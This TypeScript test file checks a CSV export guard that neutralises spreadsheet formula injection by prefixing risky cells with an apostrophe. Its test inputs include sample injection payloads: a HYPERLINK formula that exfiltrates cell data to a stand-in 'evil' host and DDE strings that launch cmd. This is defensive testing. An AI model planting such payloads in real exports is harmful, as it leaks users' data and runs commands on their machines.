/* SEC-5 (Nov 2026): CSV exports never hand a spreadsheet a formula. A cell that starts with
   = @ TAB CR, or + / - followed by anything but a number, opens as text (a leading
   apostrophe); signed amounts, phone numbers and everything else are written as before. */
import { test } from "node:test";
import assert from "node:assert/strict";
import { csvCell, toCsv, toCsvColumns } from "@/lib/core/csv-export";
import { reportCsv } from "@/lib/reports/engine";

test("formula-looking cells get a leading apostrophe (then RFC 4180 quoting as before)", () => {
  assert.equal(csvCell('=HYPERLINK("http://evil/?"&A2&B2,"المورد")'), `"'=HYPERLINK(""http://evil/?""&A2&B2,""المورد"")"`);
  assert.equal(csvCell("=1+1"), "'=1+1");
  assert.equal(csvCell("@SUM(A1:A9)"), "'@SUM(A1:A9)");
  assert.equal(csvCell("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0");
  assert.equal(csvCell("-2+3+cmd|' /C calc'!A0"), "'-2+3+cmd|' /C calc'!A0");
  assert.equal(csvCell("\t=1"), "'\t=1");
  assert.equal(csvCell("\r=1"), `"'\r=1"`);
  assert.equal(csvCell("+20-100-1234567"), "'+20-100-1234567", "a spreadsheet would subtract it");
});

test("numbers, signed amounts, phone numbers and ordinary text are unchanged", () => {
  for (const v of ["-12.50", "-1,234.50", "+12.5", "-0.0001", "(12.50)", "-(12.50)", "+201001234567", "+20 100 123 4567", "-5%", "-", "+", "12-5", "2026-11-05", "SUP-00012", "طماطم", "مزرعة =الخير", "a=b", ""]) {
    const expected = /[",\n\r]/.test(v) ? `"${v}"` : v;
    assert.equal(csvCell(v), expected, v);
  }
  assert.equal(csvCell(-12.5), "-12.5");
  assert.equal(csvCell(0), "0");
  assert.equal(csvCell(null), "");
  assert.equal(csvCell(undefined), "");
  assert.equal(csvCell('He said "hi", then left'), '"He said ""hi"", then left"');
});

test("every CSV writer goes through the guard: toCsv, toCsvColumns and the report export", () => {
  const rows = [{ name: "=HYPERLINK(\"http://x\")", amount: "-12.50" }];
  assert.equal(toCsv(rows), '﻿name,amount\r\n"\'=HYPERLINK(""http://x"")",-12.50');
  assert.equal(toCsvColumns(rows, [{ key: "name", ar: "الاسم", en: "Name" }, { key: "amount", ar: "المبلغ", en: "Amount" }], "en"), '﻿Name,Amount\r\n"\'=HYPERLINK(""http://x"")",-12.50');
  const report = {
    columns: [{ key: "supplier", type: "text", label: { ar: "المورد", en: "Supplier" } }, { key: "net", type: "money", label: { ar: "الصافي", en: "Net" } }],
    rows: [{ supplier: "@SUM(1+1)*cmd|' /C calc'!A0", net: "-40.00" }, { supplier: "مزرعة الخير", net: "1,200.00" }],
    totals: { net: "1160.00" },
  } as unknown as Parameters<typeof reportCsv>[0];
  assert.equal(reportCsv(report, "en"), "﻿Supplier,Net\r\n'@SUM(1+1)*cmd|' /C calc'!A0,-40.00\r\nمزرعة الخير,\"1,200.00\"\r\nTotal,1160.00\r\n");
});
